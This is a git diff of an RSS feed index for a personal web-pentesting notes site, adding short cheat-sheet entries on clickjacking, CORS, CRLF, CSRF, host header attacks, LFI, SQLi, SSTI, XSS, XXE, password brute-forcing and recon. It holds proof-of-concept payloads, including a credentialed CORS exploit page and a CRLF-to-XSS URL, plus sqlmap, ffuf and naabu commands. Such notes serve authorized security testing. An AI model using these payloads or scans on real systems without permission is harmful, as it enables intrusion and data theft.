@@ -113,7 +113,10 @@ Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/clickjacking/</guid>
-      <description></description>
+      <description>Clickjacking #  Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website.
+A website is vulnerable if:
+ X-Frame-Options is not set  Check header presence with:
+ https://securityheaders.com/  POC #  &amp;lt;iframe src=&amp;#34;https://example.com&amp;#34;&amp;gt; </description>
     </item>
     
     <item>
@@ -131,7 +134,28 @@ Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/cookieattacks/</guid>
-      <description>Cookie Based Attacls #  </description>
+      <description>Cookie Based Attacls #  Cookies Explained #  https://cookiepedia.co.uk/</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/cors/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/cors/</guid>
+      <description>CORS #  # https://github.com/s0md3v/Corsy python3 corsy.py -u https://example.com POC #  Simple #  &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;CORS PoC Exploit&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;center&amp;gt; &amp;lt;h1&amp;gt;CORS Exploit&amp;lt;br&amp;gt;six2dez&amp;lt;/h1&amp;gt; &amp;lt;hr&amp;gt; &amp;lt;div id=&amp;quot;demo&amp;quot;&amp;gt; &amp;lt;button type=&amp;quot;button&amp;quot; onclick=&amp;quot;cors()&amp;quot;&amp;gt;Exploit&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if(this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { document.getElementById(&amp;quot;demo&amp;quot;).innerHTML = this.responseText; } }; xhttp.open(&amp;quot;GET&amp;quot;, &amp;quot;http://&amp;lt;vulnerable-url&amp;gt;&amp;quot;, true); xhttp.withCredentials = true; xhttp.send(); } &amp;lt;/script&amp;gt; &amp;lt;/center&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; Simple with headers #  &amp;lt;html&amp;gt; &amp;lt;script&amp;gt; var http = new XMLHttpRequest(); var url = &#39;Url&#39;;//Paste here Url var params = &#39;PostData&#39;;//Paste here POST data http.</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/crlf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/crlf/</guid>
+      <description>CRLF #  Carriage Return Line Feed
+Carriage Return = ASCII 13, \r, %0D Line Feed = ASCII 10, \n, %0A
+Tools #  # https://github.com/dwisiswant0/crlfuzz crlfuzz -u &amp;quot;http://example.com&amp;quot; POC #  CRLF to XSS
+http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E </description>
     </item>
     
     <item>
@@ -140,7 +164,7 @@ Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/csrf/</guid>
-      <description></description>
+      <description>CSRF #  Conditions to exploit an useful CSRF #   Revelante action (CSRF in logout is a boo) Cookie based session (if JWT you are done here) No unpredictable request parameters  How to find #   Remove CSRF token from request, replace with random value or blank space Change POST to GET Replace CSRF token with an already used token Bypass regex Get a token by request a call manually Extract the token with XSS or HTMl injection  Generate POCs #   In burp, click in request &amp;gt; engagement tools &amp;gt; generate CSRF poc  | URL | Description | | https://pentestbook.</description>
     </item>
     
     <item>
@@ -158,7 +182,9 @@ Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/httpshosteheader/</guid>
-      <description></description>
+      <description>Host Header Attacks #  Typically host header injection are not harmful by themselves, it is necessary a chain of vulnerabilites for it to escalate.
+ Business Logic flaws Cache poisoning  Attack Vectors #     If the attack is successful, the user will receive an email that will direct to evil.com
+Common Headers #  # Make internal request, reflect to somewhere Client-IP: 127.0.0.1 Forwarded-For-Ip: 127.0.0.1 Forwarded-For: 127.</description>
     </item>
     
     <item>
@@ -167,7 +193,7 @@ Venasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/idor/</guid>
-      <description></description>
+      <description>IDOR #  https://pentestbook.six2dez.com/enumeration/web/idor</description>
     </item>
     
     <item>
@@ -189,7 +215,7 @@ Download all js files for each site and beautify: https://github.com/felipecaon/
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/lfi/</guid>
-      <description></description>
+      <description>LFI/RFI #  # https://github.com/kurobeats/fimap fimap -u &amp;quot;https://example.com?test=&amp;quot; Tricks #   PHP Filter b64 Nullbyte ending (%00) 403bypass section may help  Bypasses #  .// .\/ ./\ .\\ </description>
     </item>
     
     <item>
@@ -232,11 +258,20 @@ Social Media Share Links #  Often a websites offers its user a feature to share 
     
     <item>
       <title></title>
+      <link>https://caon.io/docs/exploitation/passwordbruteforce/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/passwordbruteforce/</guid>
+      <description>Password Bruteforcing #  Hash identify #  # https://github.com/noraj/haiti haiti hash Test for default credentials #  # https://github.com/ztgrace/changeme ./changeme.py example.com    URl Description     https://github.com/ihebski/DefaultCreds-cheat-sheet Default credentials for dozen of applications   https://cirt.net/passwords Default credentials for dozen of applications   ## ##   https://github.com/ignis-sec/Pwdb-Public Mass list of passwords, based on data   https://bit.ly/3nFUfJG Rockyou list 🤘   https://github.com/1N3/IntruderPayloads Lists used by burp    </description>
+    </item>
+    
+    <item>
+      <title></title>
       <link>https://caon.io/docs/exploitation/prototypepollution/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/prototypepollution/</guid>
-      <description>https://github.com/BlackFan/client-side-prototype-pollution</description>
+      <description>Prototype Pollution #   https://github.com/BlackFan/client-side-prototype-pollution https://github.com/msrkp/PPScan  </description>
     </item>
     
     <item>
@@ -246,8 +281,7 @@ Social Media Share Links #  Often a websites offers its user a feature to share 
       
       <guid>https://caon.io/docs/exploitation/requestsmuggling/</guid>
       <description>Request Smuggling #  It&amp;rsquo;s far more easier to search for articles explaining this concept.
-If you want to test for it:
- HTTP Request Smuggler, Burp extension Smuggler  Articles #   https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling  </description>
+Tools #   HTTP Request Smuggler, Burp extension  # https://github.com/defparam/smuggler python3 smuggler.py -u &amp;lt;URL&amp;gt; Articles #   https://portswigger.net/web-security/request-smuggling https://cobalt.io/blog/a-pentesters-guide-to-http-request-smuggling  </description>
     </item>
     
     <item>
@@ -256,7 +290,8 @@ If you want to test for it:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/sqli/</guid>
-      <description></description>
+      <description>SQLi #  sqlmap #   https://github.com/sqlmapproject/sqlmap  # request in txt sqlmap -r search-test.txt -p parameter # post sqlmap -o -u &amp;quot;http://example.com/index.php?id=1&amp;quot; --data=&amp;quot;username=admin&amp;amp;password=pass&amp;amp;submit=+Login+&amp;quot; --method=POST # get sqlmap -u &amp;quot;http://example.com/index.php?id=1&amp;quot; # with point of injection (*) sqlmap -u &amp;quot;http://example.com/index.php?id=1*-133&amp;amp;debug=true&amp;quot; # risk sqlmap -u &amp;quot;http://example.com/index.php?id=1&amp;quot; --risk=3 --level=5 Temper #  The ability to create payloads that can bypass waf
+ https://github.com/m4ll0k/Atlas  </description>
     </item>
     
     <item>
@@ -277,7 +312,7 @@ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/m
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/ssti/</guid>
-      <description>https://github.com/DiogoMRSilva/websitesVulnerableToSSTI</description>
+      <description>SSTI #  Tools #  # https://github.com/epinna/tplmap tplmap.py -u &#39;http://www.target.com/page?name=John&#39;    URL Description     https://github.com/DiogoMRSilva/websitesVulnerableToSSTI Engines vulnerable to SSTI   https://github.com/payloadbox/ssti-payloads Payloads    </description>
     </item>
     
     <item>
@@ -287,6 +322,15 @@ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/m
       
       <guid>https://caon.io/docs/exploitation/twofa/</guid>
       <description></description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/exploitation/typesofauth/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/exploitation/typesofauth/</guid>
+      <description>Authentication Types #  # Basic Auth (B64) Authorization: Basic AXVubzpwQDU1dzByYM== # Bearer Token (JWT) Authorization: Bearer &amp;lt;token&amp;gt; # API Key GET /endpoint?api_key=abcdefgh123456789 X-API-Key: abcdefgh123456789 # Digest Auth Authorization: Digest username=”admin” Realm=”abcxyz” nonce=”474754847743646”, uri=”/uri” response=”7cffhfr54685gnnfgerg8” # OAuth2.0 Authorization: Bearer hY_9.B5f-4.1BfE # Hawk Authentication Authorization: Hawk id=&amp;quot;abcxyz123&amp;quot;, ts=&amp;quot;1592459563&amp;quot;, nonce=&amp;quot;gWqbkw&amp;quot;, mac=&amp;quot;vxBCccCutXGV30gwEDKu1NDXSeqwfq7Z0sg/HP1HjOU=&amp;quot; # AWS signature Authorization: AWS4-HMAC-SHA256 Credential=abc/20200618/us-east-1/execute-api/aws4_ </description>
     </item>
     
     <item>
@@ -317,7 +361,7 @@ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/m
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/xss/</guid>
-      <description></description>
+      <description>XSS #  # https://github.com/hahwul/dalfox dalfox url http://example.com cat urls | dalfox pipe # https://github.com/KathanP19/Gxss cat list | Gxss -c 100 -p REPLACE_STRING    URL Description     https://xss.pwnfunction.com/ pwnfunction XSS games    </description>
     </item>
     
     <item>
@@ -326,7 +370,8 @@ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/m
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/exploitation/xxe/</guid>
-      <description></description>
+      <description>XXE #  Detection:
+# Content type &amp;quot;application/json&amp;quot; or &amp;quot;application/x-www-form-urlencoded&amp;quot; to &amp;quot;applcation/xml&amp;quot;. # File Uploads allows for docx/xlsx/pdf/zip, unzip the package and add your evil xml code into the xml files. # If svg allowed in picture upload, you can inject xml in svgs. # If the web app offers RSS feeds, add your milicious code into the RSS. # Fuzz for /soap api, some applications still running soap apis # If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse Check:</description>
     </item>
     
     <item>
@@ -362,7 +407,7 @@ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/m
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://caon.io/docs/recon/fuzzing/</guid>
-      <description>Fuzzing #  # https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;quot;https://streetcontxt.com/PAYLOAD&amp;quot; -H &amp;quot;HEADER:127.0.0.1&amp;quot; -X &amp;quot;METHOD&amp;quot; #Cool flags -ac: Calibrate requests to unmatch false positives -recursion: recursion -se: Stop on erors -sf: Stop on 95% 403 Forbidden, possible WAF ban Backup Files #  # https://github.com/mazen160/bfac bfac --no-text --url http://example.com/test.php --level 2 Wordlists #  WebApps #  # https://github.com/p0dalirius/webapp-wordlists # This repo contains wordlists for a lot of webapps </description>
+      <description>Fuzzing #  # https://github.com/ffuf/ffuf ffuf -w /path/to/wordlist -u https://target/FUZZ # Multiple sources ffuf -w http-methods:METHOD -w payloads:PAYLOAD -w headers:HEADER -u &amp;quot;https://streetcontxt.com/PAYLOAD&amp;quot; -H &amp;quot;HEADER:127.0.0.1&amp;quot; -X &amp;quot;METHOD&amp;quot; # Multiple URLs and mutiple files example ffuf -u URL/FUZZ -w allipstoffuf:URL -w ~/.config/wordlists/envpath:FUZZ -maxtime 300 -t 500 -c -v #Cool flags -ac: Calibrate requests to unmatch false positives -recursion: recursion -se: Stop on erors -sf: Stop on 95% 403 Forbidden, possible WAF ban Backup Files #  # https://github.</description>
     </item>
     
     <item>
@@ -373,6 +418,15 @@ http://169.254.169.254/latest/meta-data/hostname http://169.254.169.254/latest/m
       <guid>https://caon.io/docs/recon/paramdiscovery/</guid>
       <description>Parameter Discovery #  There are two tools that I prefer when doing param scanning. X8, which is a tool made just for param discovery with advanced comparison and ffuf, which is a general fuzzing tool that can be used for single param testing.
 # https://github.com/Sh1Yo/x8 x8 -u &amp;quot;https://example.com/&amp;quot; -w &amp;lt;wordlist&amp;gt; # https://github.com/ffuf/ffuf ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value Param discovering from crawling results #  Given a list with crawled urls, grep the ones that have known parameters and get only the url</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://caon.io/docs/recon/portscan/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://caon.io/docs/recon/portscan/</guid>
+      <description>Port Scan #  # https://github.com/nmap/nmap ./configure make make install # https://github.com/projectdiscovery/naabu naabu -p 80,443,21-23 -host example.com naabu -list hosts.txt cat lists | naabu -silent echo example.com | naabu -nmap-cli &#39;nmap -sC -sV -oX nmap-output&#39; </description>
     </item>
     
     <item>
